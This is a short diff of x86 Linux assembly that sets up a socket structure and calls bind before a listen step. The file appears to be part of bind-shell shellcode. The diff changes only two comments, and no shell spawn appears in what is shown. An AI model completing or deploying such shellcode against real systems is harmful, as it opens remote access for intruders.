@@ -13,7 +13,7 @@ _start:
 	;bind
 	mov ebx, eax
 	mov ax, 361
-	xor edx, edx		;need to have NULL padding
+	xor edx, edx		;NULL padding for cleaner struct
 	push edx
 	push edx
 	push edx
@@ -22,7 +22,7 @@ _start:
 	push word 0x2
 	
 	mov ecx, esp
-	mov dl, 0x10		;Padding
+	mov dl, 0x10		;struct size
 	int 0x80
 
 	;listen
